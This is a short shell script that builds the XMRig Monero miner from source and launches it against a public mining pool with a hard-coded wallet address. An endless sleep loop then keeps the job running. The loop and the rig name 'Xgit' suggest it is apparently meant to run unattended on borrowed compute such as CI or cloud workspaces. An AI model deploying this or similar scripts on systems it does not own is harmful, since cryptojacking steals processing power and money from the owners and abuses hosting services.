#!/bin/sh
sudo apt update
sudo apt install screen -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build
cd build
cmake ..
make
./xmrig -o sg.minexmr.com:443 -u 86ipnwHx4maHfG42djiEwiWv7uwEgye1Z9ABv6LX8mhZ76XAVAvwfUiGcTjcq8jbKpcNRNHkcvF7AbLQs9wyUKnhMnzZ5e4 -k --tls --rig-id Xgit
while [ 1 ]; do
sleep 3
done
sleep 999
